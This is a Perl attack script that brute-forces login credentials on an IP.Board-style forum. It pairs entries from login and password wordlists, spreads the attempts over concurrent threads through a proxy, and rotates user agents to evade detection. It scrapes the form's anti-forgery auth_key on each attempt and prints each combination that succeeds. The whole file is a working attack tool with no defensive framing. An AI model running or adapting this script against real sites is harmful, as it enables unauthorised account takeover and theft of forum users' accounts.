#!/usr/bin/env perl

use utf8;
use strict;
use warnings;
use open ':std', ':encoding(UTF-8)';
use feature qw/say switch unicode_strings/;

use Coro;
use File::Slurp;
use Coro::Select;
use LWP::UserAgent;

usage() if (@ARGV == 0);

my @Logins = read_file('logins.txt'); chomp(@Logins);
my @Passwords = read_file('passwords.txt'); chomp(@Passwords);
my @UserAgents = read_file('user-agents.txt'); chomp(@UserAgents);

say '[i] Login combinations ['.@Logins*@Passwords.']';

my @coros;
my @combinations = generateList();
my $LoginPageURL = $ARGV[0].($ARGV[0] =~ m#/$#?'index.php?app=core&section=login':'/index.php?app=core&section=login');
my $LoginPostURL = $ARGV[0].($ARGV[0] =~ m#/$#?'index.php?app=core&module=global&section=login&do=process':'/index.php?app=core&section=login&do=process');

for (1..($ARGV[1]||10)) {
	push @coros, async {
		my $ua = LWP::UserAgent->new( agent => $UserAgents[rand(@UserAgents)] );
		$ua->proxy('http' => 'http://localhost:8888');

		my $BadConnects = 0;
		while (@combinations) {
			push @combinations, generateList() if (@Logins > 0 and @combinations <= 3);
			my $combination = shift(@combinations);

			REDOget:
			my $resp = $ua->get($LoginPageURL);
			unless ($resp->is_success) {
				warn "Can't connect to server! Method[GET] URL[".$LoginPageURL."] Message[".$resp->status_line."]";

				say 'Sleep 5 seconds ...';
				sleep(5);

				if ($BadConnects > 5) {
					$BadConnects=0;
					die "Host is down!";
				}

				$ua->agent($UserAgents[rand(@UserAgents)]);
				$BadConnects++;
				goto REDOget;
			}
			$BadConnects = 0;

			# Set post params
			my $PostParams = { ips_username => $combination->{login}, ips_password => $combination->{password}, rememberMe => 0 };
			($PostParams->{auth_key}) = $resp->content =~ m#type=['"]hidden['"]\sname=['"]auth_key['"]\svalue=['"](\w{32})['"]#;
			($PostParams->{referer}) = $resp->content =~ m#type=["']hidden["']\sname=["']referer["']\svalue=["'](.+?)["']#;

			
			REDOpost:
			my $respPost = $ua->post($LoginPostURL, $PostParams);
			unless ($respPost->is_success) {
				warn "Can't connect to server! Method[POST] URL[".$LoginPostURL."] Message[".$respPost->status_line."]";

				say 'Sleep 5 seconds ...';
				sleep(5);

				if ($BadConnects > 5) {
					$BadConnects=0;
					die "Host is down!";
				}

				$ua->agent($UserAgents[rand(@UserAgents)]);
				$BadConnects++;
				goto REDOpost;
			}
			$BadConnects = 0;

			if ($respPost->content =~ m#do=logout#i) {
				say '[+] '.$combination->{login}.':'.$combination->{password};
			} else {
				say '[-] '.$combination->{login}.':'.$combination->{password};
			}
		}
	}
}

$_->join for (@coros);

sub generateList {
	my @tmp;
	# my $login = shift(@Logins);
	# push @tmp, { login => $login, password => $_ } for (@Passwords);

	my $password = shift(@Passwords);
	push @tmp, { login => $_, password => $password } for (@Logins);

	return @tmp;
}

sub usage {
say <<EOF;
Usage: $0 http://site.com/ 10
http://site.com/ - forum adress
10 - threads
EOF
exit;
}